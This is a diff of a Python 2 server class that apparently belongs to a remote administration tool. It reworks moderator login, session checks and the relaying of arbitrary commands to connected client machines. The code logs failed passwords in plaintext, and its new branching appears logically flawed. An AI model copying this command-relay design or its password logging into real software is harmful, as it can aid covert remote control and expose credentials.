@@ -183,23 +183,20 @@ class ModeratServer:
                 self.moderator_threads[self.moderator_address[1]].start()
 
     def moderator_listener(self, sock, socket_id):
-        while 1:
+        active_moderator = True
+        while active_moderator:
             try:
                 session_id, data = moderator_receive(sock)
-                if data == 'initSession':
-                    if session_id in self.active_sessions:
-                        print '[+] Start Moderators Checker Session ID (%s)' % session_id
-                        moderator_send(sock, 'sessionSuccess', session_id)
+
+                if data.startswith('auth ') or SessionsManagment().check_session(session_id):
+                    if data == 'getClients':
+                        username_from_sessions = SessionsManagment().get_session(session_id)
+                        output = self.command_get_clients(username_from_sessions)
+                        moderator_send(sock, output, session_id)
                     else:
-                        moderator_send(sock, 'sessionError', session_id)
-                        continue
-                elif data.startswith('auth '):
-                    print '[+] New Moderator Connection'
-                    try:
                         command, username, password = data.split()
                         if ModeratorsManagment().login_user(username, password):
                             print '[+] Login Success For Moderator (%s) Session ID (%s)' % (username, session_id)
-                            self.active_sessions.append(session_id)
                             SessionsManagment().create_session(username, session_id)
                             moderator_send(sock, 'LoginSuccess', session_id)
 
@@ -207,29 +204,31 @@ class ModeratServer:
                             print '[!] Login Failed With (%s, %s)' % (username, password)
                             moderator_send(sock, 'LoginError', session_id)
                             continue
-                    except Exception as e:
-                        print e
-                        continue
+
+                    # Active Moderator
+                    while 1:
+                        try:
+                            client_socket, data = moderator_receive(sock)
+                            if data == 'getClients':
+                                username_from_sessions = SessionsManagment().get_session(session_id)
+                                output = self.command_get_clients(username_from_sessions)
+                            elif data.startswith('setAlias '):
+                                output = ClientsManagment().set_alias(client_socket, data.split()[-1])
+                            else:
+                                if len(data) != 0:
+                                    output = self.command_all(data, client_socket)
+                                else:
+                                    active_moderator = False
+                                    break
+                            moderator_send(sock, output, client_socket)
+                        except socket.error:
+                            active_moderator = False
+
                 else:
-                    moderator_send(sock, 'AuthError', session_id)
-                while 1:
-                    try:
-                        client_socket, data = moderator_receive(sock)
-                        if data == 'getClients':
-                            username_from_sessions = SessionsManagment().get_session(session_id)
-                            output = self.command_get_clients(username_from_sessions)
-                        elif data.startswith('setAlias '):
-                            output = ClientsManagment().set_alias(client_socket, data.split()[-1])
-                        elif data == 'quitModerator':
-                            print '[!] Moderator Checker Exit'
-                            output = ''
-                        else:
-                            output = self.command_all(data, client_socket)
-                        moderator_send(sock, output, client_socket)
-                    except socket.error:
-                        break
+                    continue
+
             except socket.error:
-                break
+                return
             time.sleep(3)
 
     # Moderator Commands
